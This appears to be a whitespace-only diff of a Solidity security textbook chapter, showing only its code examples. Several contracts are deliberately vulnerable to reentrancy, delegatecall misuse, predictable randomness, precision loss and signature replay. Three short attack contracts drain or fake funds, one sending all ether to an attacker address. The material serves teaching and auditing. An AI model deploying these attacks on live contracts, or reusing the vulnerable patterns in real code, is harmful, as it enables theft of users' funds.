@@ -50,25 +50,25 @@ Reentrancy can be tricky to grasp without a practical example. Take a look at th
 
 ```solidity
 1 contract EtherStore {
-2      uint256 public withdrawalLimit = 1 ether;
-3      mapping(address => uint256) public lastWithdrawTime;
-4    mapping(address => uint256) balances;
+2      uint256 public withdrawalLimit = 1 ether;
+3      mapping(address => uint256) public lastWithdrawTime;
+4    mapping(address => uint256) balances;
 5
-6    function depositFunds() public payable{
-7      balances[msg.sender] += msg.value;
-8    }
+6    function depositFunds() public payable{
+7      balances[msg.sender] += msg.value;
+8    }
 9
-10    function withdrawFunds() public {
-11        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
-12        uint256 _amt = balances[msg.sender];
-13        if(_amt > withdrawalLimit){
-14            _amt = withdrawalLimit;
-15        }
-16      (bool res, ) = address(msg.sender).call{value: _amt}("");
-17        require(res, "Transfer failed");
-18      balances[msg.sender] -= _amt; // assume Solidity <0.8: underflow wraps (exploitable); Solidity >=0.8: reverts here
-19        lastWithdrawTime[msg.sender] = block.timestamp;
-20    }
+10    function withdrawFunds() public {
+11        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
+12        uint256 _amt = balances[msg.sender];
+13        if(_amt > withdrawalLimit){
+14            _amt = withdrawalLimit;
+15        }
+16      (bool res, ) = address(msg.sender).call{value: _amt}("");
+17        require(res, "Transfer failed");
+18      balances[msg.sender] -= _amt; // assume Solidity <0.8: underflow wraps (exploitable); Solidity >=0.8: reverts here
+19        lastWithdrawTime[msg.sender] = block.timestamp;
+20    }
 21 }
 ```
 
@@ -80,33 +80,33 @@ The vulnerability is in line 16, where the contract sends the user their request
 
 ```solidity
 1 contract Attack {
-2  EtherStore public etherStore;
+2  EtherStore public etherStore;
 3
-4  // initialize the etherStore variable with the contract address
-5  constructor(address _etherStoreAddress) {
-6      etherStore = EtherStore(_etherStoreAddress);
-7  }
+4  // initialize the etherStore variable with the contract address
+5  constructor(address _etherStoreAddress) {
+6      etherStore = EtherStore(_etherStoreAddress);
+7  }
 8
-9  function attackEtherStore() public payable {
-10      // attack to the nearest ether
-11      require(msg.value >= 1 ether, "no bal");
-12      // send eth to the depositFunds() function
-13      etherStore.depositFunds{value: 1 ether}();
-14      // start the magic
-15      etherStore.withdrawFunds();
-16  }
+9  function attackEtherStore() public payable {
+10      // attack to the nearest ether
+11      require(msg.value >= 1 ether, "no bal");
+12      // send eth to the depositFunds() function
+13      etherStore.depositFunds{value: 1 ether}();
+14      // start the magic
+15      etherStore.withdrawFunds();
+16  }
 17
-18  function collectEther() public {
-19      payable(msg.sender).transfer(address(this).balance);
-20  }
+18  function collectEther() public {
+19      payable(msg.sender).transfer(address(this).balance);
+20  }
 21
-22  // receive function - the fallback() function would have worked out too
-23  receive() external payable {
-24      if (address(etherStore).balance >= 1 ether) {
-25          // reentrant call to victim contract
-26          etherStore.withdrawFunds();
-27      }
-28  }
+22  // receive function - the fallback() function would have worked out too
+23  receive() external payable {
+24      if (address(etherStore).balance >= 1 ether) {
+25          // reentrant call to victim contract
+26          etherStore.withdrawFunds();
+27      }
+28  }
 29 }
 ```
 
@@ -154,21 +154,21 @@ Another useful technique is applying a reentrancy lock. A *reentrancy lock* is a
 
 ```solidity
 contract EtherStore {
-    bool lock;
-      uint256 public withdrawalLimit = 1 ether;
-      mapping(address => uint256) public lastWithdrawTime;
-    mapping(address => uint256) balances;
+    bool lock;
+      uint256 public withdrawalLimit = 1 ether;
+      mapping(address => uint256) public lastWithdrawTime;
+    mapping(address => uint256) balances;
 
-      modifier nonReentrant {
-      require(!lock, "Can't reenter");
-      lock = true;
-      _;
-      lock = false;
-    }
+      modifier nonReentrant {
+      require(!lock, "Can't reenter");
+      lock = true;
+      _;
+      lock = false;
+    }
 
-    function withdrawFunds() public nonReentrant{
-        [...]
-    }
+    function withdrawFunds() public nonReentrant{
+        [...]
+    }
 }
 ```
 
@@ -192,51 +192,51 @@ A recent exploit where reentrancy was the sole attack vector is the July 2023 ca
 
 ```solidity
 function _deposit(
-    uint256 assets,
-    address receiver,
-    bytes calldata data,
-    uint256 nav
+    uint256 assets,
+    address receiver,
+    bytes calldata data,
+    uint256 nav
 ) private returns (uint256 shares) {
-        /*
-        validations
-    */
-    uint256 returnAmount = 0;
-    uint256 swapAmount = 0;
-    if (BASIS_POINT_MAX > invariant) {
-        swapAmount = assetsToToken1(assets);
-        returnAmount = userSwap( // External call
-            data,
-            address(this),
-            swapAmount,
-            address(asset),
-            address(other)
-        );
-    }
-    uint256 supply = totalSupply(); // State update
-    if (0 < supply) {
-        uint256 valueToken0 = getValueInNumeraire(
-            asset,
-            assets - swapAmount,
-            MathUpgradeable.Rounding.Down
-        );
-        uint256 valueToken1 = getValueInNumeraire(
-            other,
-            returnAmount,
-            MathUpgradeable.Rounding.Down
-        );
-        shares = supply.mulDiv(
-            valueToken0 + valueToken1,
-            nav,
-            MathUpgradeable.Rounding.Down
-        );
-    } else {
-        shares = INITIAL_SHARE;
-    }
-    uint256 feeAmount = shares.mulDiv(
-        entryFee, BASIS_POINT_MAX, MathUpgradeable.Rounding.Down
-    );
-    _mint(receiver, shares - feeAmount);
-    _mint(owner(), feeAmount);
+        /*
+        validations
+    */
+    uint256 returnAmount = 0;
+    uint256 swapAmount = 0;
+    if (BASIS_POINT_MAX > invariant) {
+        swapAmount = assetsToToken1(assets);
+        returnAmount = userSwap( // External call
+            data,
+            address(this),
+            swapAmount,
+            address(asset),
+            address(other)
+        );
+    }
+    uint256 supply = totalSupply(); // State update
+    if (0 < supply) {
+        uint256 valueToken0 = getValueInNumeraire(
+            asset,
+            assets - swapAmount,
+            MathUpgradeable.Rounding.Down
+        );
+        uint256 valueToken1 = getValueInNumeraire(
+            other,
+            returnAmount,
+            MathUpgradeable.Rounding.Down
+        );
+        shares = supply.mulDiv(
+            valueToken0 + valueToken1,
+            nav,
+            MathUpgradeable.Rounding.Down
+        );
+    } else {
+        shares = INITIAL_SHARE;
+    }
+    uint256 feeAmount = shares.mulDiv(
+        entryFee, BASIS_POINT_MAX, MathUpgradeable.Rounding.Down
+    );
+    _mint(receiver, shares - feeAmount);
+    _mint(owner(), feeAmount);
 }
 ```
 
@@ -255,24 +255,24 @@ As a result of the context-preserving nature of `DELEGATECALL`, building vulnera
 ```solidity
 1 // library contract - calculates Fibonacci-like numbers
 2 contract FibonacciLib {
-3     // initializing the standard Fibonacci sequence
-4     uint256 public start;
-5     uint256 public calculatedFibNumber;
+3     // initializing the standard Fibonacci sequence
+4     uint256 public start;
+5     uint256 public calculatedFibNumber;
 6
-7     // modify the zeroth number in the sequence
-8     function setStart(uint256 _start) public {
-9         start = _start;
-10     }
+7     // modify the zeroth number in the sequence
+8     function setStart(uint256 _start) public {
+9         start = _start;
+10     }
 11
-12     function setFibonacci(uint256 n) public {
-13         calculatedFibNumber = fibonacci(n);
-14     }
+12     function setFibonacci(uint256 n) public {
+13         calculatedFibNumber = fibonacci(n);
+14     }
 15
-16     function fibonacci(uint256 n) internal view returns (uint) {
-17         if (n == 0) return start;
-18         else if (n == 1) return start + 1;
-19         else return fibonacci(n - 1) + fibonacci(n - 2);
-20     }
+16     function fibonacci(uint256 n) internal view returns (uint) {
+17         if (n == 0) return start;
+18         else if (n == 1) return start + 1;
+19         else return fibonacci(n - 1) + fibonacci(n - 2);
+20     }
 21 }
 ```
 
@@ -282,33 +282,33 @@ Let us now consider a contract that utilizes this library:
 
 ```solidity
 contract FibonacciBalance {
-    address public fibonacciLibrary;
-    // the current Fibonacci number to withdraw
-    uint256 public calculatedFibNumber;
-    // the starting Fibonacci sequence number
-    uint256 public start = 3;
-    uint256 public withdrawalCounter;
-    // the Fibonacci function selector
-    bytes4 constant fibSig = bytes4(keccak256("setFibonacci(uint256)"));
-    // constructor - loads the contract with ether
-    constructor(address _fibonacciLibrary) payable {
-        fibonacciLibrary = _fibonacciLibrary;
-    }
-    function withdraw() public {
-        withdrawalCounter += 1;
-        // calculate the Fibonacci number for the current withdrawal user
-        // this sets calculatedFibNumber
-        (bool success, ) = fibonacciLibrary.delegatecall(
-            abi.encodeWithSelector(fibSig, withdrawalCounter)
-        );
-        require(success, "Delegatecall failed");
-        payable(msg.sender).transfer(calculatedFibNumber * 1 ether);
-    }
-    // allow users to call Fibonacci library functions
-    fallback() external {
-        (bool success, ) = fibonacciLibrary.delegatecall(msg.data);
-        require(success, "Delegatecall failed");
-    }
+    address public fibonacciLibrary;
+    // the current Fibonacci number to withdraw
+    uint256 public calculatedFibNumber;
+    // the starting Fibonacci sequence number
+    uint256 public start = 3;
+    uint256 public withdrawalCounter;
+    // the Fibonacci function selector
+    bytes4 constant fibSig = bytes4(keccak256("setFibonacci(uint256)"));
+    // constructor - loads the contract with ether
+    constructor(address _fibonacciLibrary) payable {
+        fibonacciLibrary = _fibonacciLibrary;
+    }
+    function withdraw() public {
+        withdrawalCounter += 1;
+        // calculate the Fibonacci number for the current withdrawal user
+        // this sets calculatedFibNumber
+        (bool success, ) = fibonacciLibrary.delegatecall(
+            abi.encodeWithSelector(fibSig, withdrawalCounter)
+        );
+        require(success, "Delegatecall failed");
+        payable(msg.sender).transfer(calculatedFibNumber * 1 ether);
+    }
+    // allow users to call Fibonacci library functions
+    fallback() external {
+        (bool success, ) = fibonacciLibrary.delegatecall(msg.data);
+        require(success, "Delegatecall failed");
+    }
 }
 ```
 
@@ -332,14 +332,14 @@ Even worse, the `FibonacciBalance` contract allows users to call all of the `fib
 
 ```solidity
 contract Attack {
-    uint256 private storageSlot0; // corresponds to fibonacciLibrary
-    uint256 private storageSlot1; // corresponds to calculatedFibNumber
-    // fallback - this will run if a specified function is not found
-    fallback() external {
-        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
-        // is called we don’t send out any ether
-        payable(<attacker_address>).transfer(this.balance); // we take all the ether
-    }
+    uint256 private storageSlot0; // corresponds to fibonacciLibrary
+    uint256 private storageSlot1; // corresponds to calculatedFibNumber
+    // fallback - this will run if a specified function is not found
+    fallback() external {
+        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
+        // is called we don’t send out any ether
+        payable(<attacker_address>).transfer(this.balance); // we take all the ether
+    }
 }
 ```
 
@@ -362,25 +362,25 @@ The library contract is as follows:
 ```solidity
 1 contract WalletLibrary is WalletEvents {
 2
-3   ...
+3   ...
 4
-5   // throw unless the contract is not yet initialized.
-6   modifier only_uninitialized { if (m_numOwners > 0) revert(); _; }
+5   // throw unless the contract is not yet initialized.
+6   modifier only_uninitialized { if (m_numOwners > 0) revert(); _; }
 7
-8   // constructor - just pass on the owner array to multiowned and
-9   // the limit to daylimit
-10   function initWallet(address[] memory _owners, uint256 _required, uint256
-11        _daylimit) public only_uninitialized {
-12     initDaylimit(_daylimit);
-13     initMultiowned(_owners, _required);
-14   }
+8   // constructor - just pass on the owner array to multiowned and
+9   // the limit to daylimit
+10   function initWallet(address[] memory _owners, uint256 _required, uint256
+11        _daylimit) public only_uninitialized {
+12     initDaylimit(_daylimit);
+13     initMultiowned(_owners, _required);
+14   }
 15
-16   // kills the contract sending everything to `_to`.
-17   function kill(address _to) onlymanyowners(keccak256(msg.data)) external {
-18     selfdestruct(_to);
-19   }
+16   // kills the contract sending everything to `_to`.
+17   function kill(address _to) onlymanyowners(keccak256(msg.data)) external {
+18     selfdestruct(_to);
+19   }
 20
-21   ...
+21   ...
 22
 23 }
 ```
@@ -390,24 +390,24 @@ And here’s the wallet contract:
 ```solidity
 1 contract Wallet is WalletEvents {
 2
-3   ...
+3   ...
 4
-5   // METHODS
+5   // METHODS
 6
-7   // gets called when no other function matches
-8   fallback() external payable {
-9     // just being sent some cash?
-10     if (msg.value > 0)
-11       Deposit(msg.sender, msg.value);
-12     else if (msg.data.length > 0)
-13       _walletLibrary.delegatecall(msg.data);
-14   }
+7   // gets called when no other function matches
+8   fallback() external payable {
+9     // just being sent some cash?
+10     if (msg.value > 0)
+11       Deposit(msg.sender, msg.value);
+12     else if (msg.data.length > 0)
+13       _walletLibrary.delegatecall(msg.data);
+14   }
 15
-16   ...
+16   ...
 17
-18   // FIELDS
-19   address constant _walletLibrary =
-20     0xcafecafecafecafecafecafecafecafecafecafe;
+18   // FIELDS
+19   address constant _walletLibrary =
+20     0xcafecafecafecafecafecafecafecafecafecafe;
 21 }
 ```
 
@@ -453,27 +453,27 @@ Fomo3D was an Ethereum lottery game where players bought “keys” to extend a 
 
 ```solidity
 function airdrop()
-        private
-        view
-        returns(bool)
-    {
-        uint256 seed = uint256(keccak256(abi.encodePacked(
+        private
+        view
+        returns(bool)
+    {
+        uint256 seed = uint256(keccak256(abi.encodePacked(
 
-            (block.timestamp).add
-            (block.difficulty).add
-            ((uint256(keccak256(abi.encodePacked
-            (block.coinbase)))) / (block.timestamp)).add
-            (block.gaslimit).add
-            ((uint256(keccak256(abi.encodePacked
-            (msg.sender)))) / (block.timestamp)).add
-            (block.number)
-        )));
-        if((seed - ((seed / 1000) * 1000)) < airDropTracker_) {
-            return(true);
-        } else {
-            return(false);
-        }
-    }
+            (block.timestamp).add
+            (block.difficulty).add
+            ((uint256(keccak256(abi.encodePacked
+            (block.coinbase)))) / (block.timestamp)).add
+            (block.gaslimit).add
+            ((uint256(keccak256(abi.encodePacked
+            (msg.sender)))) / (block.timestamp)).add
+            (block.number)
+        )));
+        if((seed - ((seed / 1000) * 1000)) < airDropTracker_) {
+            return(true);
+        } else {
+            return(false);
+        }
+    }
 ```
 
 A malicious contract would know in advance the values used to compute the seed, allowing it to trigger the `airdrop` function only when it would result in a win. It’s no surprise the contract was exploited.
@@ -491,22 +491,22 @@ Consider the contract in Example 9-4.
 ```solidity
 1 contract Lotto {
 2
-3     bool public payedOut;
-4     address public winner;
-5     uint256 public winAmount;
+3     bool public payedOut;
+4     address public winner;
+5     uint256 public winAmount;
 6
-7     // ... extra functionality here
+7     // ... extra functionality here
 8
-9     function sendToWinner() public {
-10         require(!payedOut);
-11         payable(winner).send(winAmount);
-12         payedOut = true;
-13     }
+9     function sendToWinner() public {
+10         require(!payedOut);
+11         payable(winner).send(winAmount);
+12         payedOut = true;
+13     }
 14
-15     function withdrawLeftOver() public {
-16         require(payedOut);
-17         payable(msg.sender).send(address(this).balance);
-18     }
+15     function withdrawLeftOver() public {
+16         require(payedOut);
+17         payable(msg.sender).send(address(this).balance);
+18     }
 19 }
 ```
 
@@ -528,20 +528,20 @@ Consider the function `cash` in Example 9-5: again, the following code snippet h
 
 ```solidity
 1 function cash(uint256 roundIndex, uint256 subpotIndex) public {
-2    uint256 subpotsCount = getSubpotsCount(roundIndex);
-3    if(subpotIndex>=subpotsCount)
-4        return;
-5    uint256 decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);
-6    if(decisionBlockNumber>block.number)
-7        return;
-8    if(rounds[roundIndex].isCashed[subpotIndex])
-9        return;
-10    //Subpots can only be cashed once. This is to prevent double payouts
-11    address winner = calculateWinner(roundIndex,subpotIndex);
-12    uint256 subpot = getSubpot(roundIndex);
-13    payable(winner).send(subpot);
-14    rounds[roundIndex].isCashed[subpotIndex] = true;
-15    //Mark the round as cashed
+2    uint256 subpotsCount = getSubpotsCount(roundIndex);
+3    if(subpotIndex>=subpotsCount)
+4        return;
+5    uint256 decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);
+6    if(decisionBlockNumber>block.number)
+7        return;
+8    if(rounds[roundIndex].isCashed[subpotIndex])
+9        return;
+10    //Subpots can only be cashed once. This is to prevent double payouts
+11    address winner = calculateWinner(roundIndex,subpotIndex);
+12    uint256 subpot = getSubpot(roundIndex);
+13    payable(winner).send(subpot);
+14    rounds[roundIndex].isCashed[subpotIndex] = true;
+15    //Mark the round as cashed
 16 }
 ```
 
@@ -573,14 +573,14 @@ Let’s see how this could work with a simple example. Consider the contract sho
 
 ```solidity
 contract FindThisHash {
-    bytes32 constant public hash =
-      0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;
-    constructor() payable {} // load with ether
-    function solve(string memory solution) public {
-        // If you can find the pre-image of the hash, receive 1000 ether
-        require(hash == keccak256(abi.encodePacked(solution)));
-        payable(msg.sender).transfer(1000 ether);
-    }
+    bytes32 constant public hash =
+      0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;
+    constructor() payable {} // load with ether
+    function solve(string memory solution) public {
+        // If you can find the pre-image of the hash, receive 1000 ether
+        require(hash == keccak256(abi.encodePacked(solution)));
+        payable(msg.sender).transfer(1000 ether);
+    }
 }
 ```
 
@@ -614,25 +614,25 @@ This pattern typically appears when an owner wishes to distribute tokens to inve
 
 ```solidity
 1 contract DistributeTokens {
-2     address public owner; // gets set somewhere
-3     address[] investors; // array of investors
-4     uint[] investorTokens; // the amount of tokens each investor gets
+2     address public owner; // gets set somewhere
+3     address[] investors; // array of investors
+4     uint[] investorTokens; // the amount of tokens each investor gets
 5
-6     // ... extra functionality, including transfertoken()
+6     // ... extra functionality, including transfertoken()
 7
-8     function invest() public payable {
-9         investors.push(msg.sender);
-10         investorTokens.push(msg.value * 5); // 5 times the wei sent
-11         }
+8     function invest() public payable {
+9         investors.push(msg.sender);
+10         investorTokens.push(msg.value * 5); // 5 times the wei sent
+11         }
 12
-13     function distribute() public {
-14         require(msg.sender == owner); // only owner
-15         for(uint256 i = 0; i < investors.length; i++) {
-16             // here transferToken(to,amount) transfers "amount" of
-17             // tokens to the address "to"
-18             transferToken(investors[i],investorTokens[i]);
-19         }
-20     }
+13     function distribute() public {
+14         require(msg.sender == owner); // only owner
+15         for(uint256 i = 0; i < investors.length; i++) {
+16             // here transferToken(to,amount) transfers "amount" of
+17             // tokens to the address "to"
+18             transferToken(investors[i],investorTokens[i]);
+19         }
+20     }
 21 }
 ```
 
@@ -678,22 +678,22 @@ Fixed-point numbers are not yet fully supported by Solidity. They can be declare
 
 ```solidity
 1 contract FunWithNumbers {
-2    uint256 constant public tokensPerEth = 10;
-3    uint256 constant public weiPerEth = 1e18;
-4    mapping(address => uint) public balances;
+2    uint256 constant public tokensPerEth = 10;
+3    uint256 constant public weiPerEth = 1e18;
+4    mapping(address => uint) public balances;
 5
-6    function buyTokens() public payable {
-7        // convert wei to eth, then multiply by token rate
-8        uint256 tokens = msg.value/weiPerEth*tokensPerEth;
-9        balances[msg.sender] += tokens;
-10    }
+6    function buyTokens() public payable {
+7        // convert wei to eth, then multiply by token rate
+8        uint256 tokens = msg.value/weiPerEth*tokensPerEth;
+9        balances[msg.sender] += tokens;
+10    }
 11
-12    function sellTokens(uint256 tokens) public {
-13        require(balances[msg.sender] >= tokens);
-14        uint256 eth = tokens/tokensPerEth;
-15        balances[msg.sender] -= tokens;
-16        payable(msg.sender).transfer(eth*weiPerEth);
-17    }
+12    function sellTokens(uint256 tokens) public {
+13        require(balances[msg.sender] >= tokens);
+14        uint256 eth = tokens/tokensPerEth;
+15        balances[msg.sender] -= tokens;
+16        payable(msg.sender).transfer(eth*weiPerEth);
+17    }
 18 }
 ```
 
@@ -721,46 +721,46 @@ We will now see a precision-loss vulnerability commonly exploited in the wild, u
 
 ```solidity
 1 abstract contract ERC4626 is ERC20, IERC4626 {
-2    using Math for uint256;
-3    IERC20 private immutable _asset;
+2    using Math for uint256;
+3    IERC20 private immutable _asset;
 4
-5    constructor(IERC20 asset_) {
-6        _asset = asset_;
-7    }
+5    constructor(IERC20 asset_) {
+6        _asset = asset_;
+7    }
 8
-9    function totalAssets() public view returns (uint256) {
-10        return _asset.balanceOf(address(this));
-11    }
-12    function deposit(address receiver, uint256 assets) public {
-13        uint256 shares = _convertToShares(assets, Math.Rounding.Down);
-14        SafeERC20.safeTransferFrom(_asset, msg.sender, address(this), assets);
-15        _mint(receiver, shares);
-16        emit Deposit(msg.sender, receiver, assets, shares);
-17    }
-18    function _withdraw(address receiver, uint256 assets) public {
-19        uint256 shares = _convertToShares(assets, Math.Rounding.Up);
-20        _burn(msg.sender, shares);
-21        SafeERC20.safeTransfer(_asset, receiver, assets);
-22        emit Withdraw(msg.sender, receiver, msg.sender, assets, shares);
-23    }
-24    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view
-      returns (uint256) {
-25        uint256 supply = totalSupply();
-26        return
-27            (assets == 0 || supply == 0)
-28                ? assets
-29                : assets.mulDiv(supply, totalAssets(), rounding); // (assets * supply) /
-                  totalAssets()
-30    }
-31    function _convertToAssets(uint256 shares, Math.Rounding rounding) public view returns
-      (uint256) {
-32        uint256 supply = totalSupply();
-33        return
-34            (supply == 0)
-35                ? shares
-36                : shares.mulDiv(totalAssets(), supply, rounding); // (shares * totalAssets())
-                  / supply
-37    }
+9    function totalAssets() public view returns (uint256) {
+10        return _asset.balanceOf(address(this));
+11    }
+12    function deposit(address receiver, uint256 assets) public {
+13        uint256 shares = _convertToShares(assets, Math.Rounding.Down);
+14        SafeERC20.safeTransferFrom(_asset, msg.sender, address(this), assets);
+15        _mint(receiver, shares);
+16        emit Deposit(msg.sender, receiver, assets, shares);
+17    }
+18    function _withdraw(address receiver, uint256 assets) public {
+19        uint256 shares = _convertToShares(assets, Math.Rounding.Up);
+20        _burn(msg.sender, shares);
+21        SafeERC20.safeTransfer(_asset, receiver, assets);
+22        emit Withdraw(msg.sender, receiver, msg.sender, assets, shares);
+23    }
+24    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view
+      returns (uint256) {
+25        uint256 supply = totalSupply();
+26        return
+27            (assets == 0 || supply == 0)
+28                ? assets
+29                : assets.mulDiv(supply, totalAssets(), rounding); // (assets * supply) /
+                  totalAssets()
+30    }
+31    function _convertToAssets(uint256 shares, Math.Rounding rounding) public view returns
+      (uint256) {
+32        uint256 supply = totalSupply();
+33        return
+34            (supply == 0)
+35                ? shares
+36                : shares.mulDiv(totalAssets(), supply, rounding); // (shares * totalAssets())
+                  / supply
+37    }
 38 }
 ```
 
@@ -854,18 +854,18 @@ Check this sample code of a vulnerable yield aggregator protocol:
 
 ```solidity
 contract Aggregator {
-    function stake( ... ) external {
-        ...
-    }
-    function claimMultipleStakingRewards(address[] calldata _claimContracts) external {
-        uint256 totalRewards;
-        for (uint256 i = 0; i < _claimContracts.length; i++) {
-            totalRewards += IClaimContract(_claimContracts[i]).claimStakingRewards(
-            msg.sender
-            );
-        }
-        IERC20(stakingToken).transfer(msg.sender, totalRewards);
-    }
+    function stake( ... ) external {
+        ...
+    }
+    function claimMultipleStakingRewards(address[] calldata _claimContracts) external {
+        uint256 totalRewards;
+        for (uint256 i = 0; i < _claimContracts.length; i++) {
+            totalRewards += IClaimContract(_claimContracts[i]).claimStakingRewards(
+            msg.sender
+            );
+        }
+        IERC20(stakingToken).transfer(msg.sender, totalRewards);
+    }
 }
 ```
 
@@ -875,9 +875,9 @@ For instance, an attacker can deploy a contract like this:
 
 ```solidity
 contract Attack {
-    function claimStakingRewards(address ) external pure returns (uint256) {
-        return 1_000_000 ether; // fabricated reward
-    }
+    function claimStakingRewards(address ) external pure returns (uint256) {
+        return 1_000_000 ether; // fabricated reward
+    }
 }
 ```
 
@@ -897,28 +897,28 @@ Let’s look at an example contract (Example 9-10) that’s vulnerable to replay
 
 ```solidity
 1 contract Token {
-2    mapping(address => uint256) public balances;
-3    struct Signature {
-4        bytes32 r;
-5        bytes32 s;
-6        uint8 v;
-7    }
-8    event Transfer(address indexed from, address indexed to, uint256 amount);
-9    function transfer(uint256[] memory _amount, address[] memory _from, address[]
-     memory _to,  Signature memory _signature) public {
-10        bytes32 messageHash = keccak256(abi.encodePacked(_from, _to, _amount));
-11        address signer = ecrecover(messageHash, _signature.v, _signature.r, _signature.s);
-12        for(uint256 i = 0; i < _from.length; i++){
-13            address __from = _from[i];
-14            address __to = _to[i];
-15            uint256 __amount = _amount[i];
-16            require(balances[__from] >= _amount[i], "Insufficient balance");
-17            require(signer == _from[i], "Invalid signature");
-18            balances[__from] -= __amount;
-19            balances[__to] += __amount;
-20            emit Transfer(__from, __to, __amount);
-21        }
-22    }
+2    mapping(address => uint256) public balances;
+3    struct Signature {
+4        bytes32 r;
+5        bytes32 s;
+6        uint8 v;
+7    }
+8    event Transfer(address indexed from, address indexed to, uint256 amount);
+9    function transfer(uint256[] memory _amount, address[] memory _from, address[]
+     memory _to,  Signature memory _signature) public {
+10        bytes32 messageHash = keccak256(abi.encodePacked(_from, _to, _amount));
+11        address signer = ecrecover(messageHash, _signature.v, _signature.r, _signature.s);
+12        for(uint256 i = 0; i < _from.length; i++){
+13            address __from = _from[i];
+14            address __to = _to[i];
+15            uint256 __amount = _amount[i];
+16            require(balances[__from] >= _amount[i], "Insufficient balance");
+17            require(signer == _from[i], "Invalid signature");
+18            balances[__from] -= __amount;
+19            balances[__to] += __amount;
+20            emit Transfer(__from, __to, __amount);
+21        }
+22    }
 23 }
 ```
 
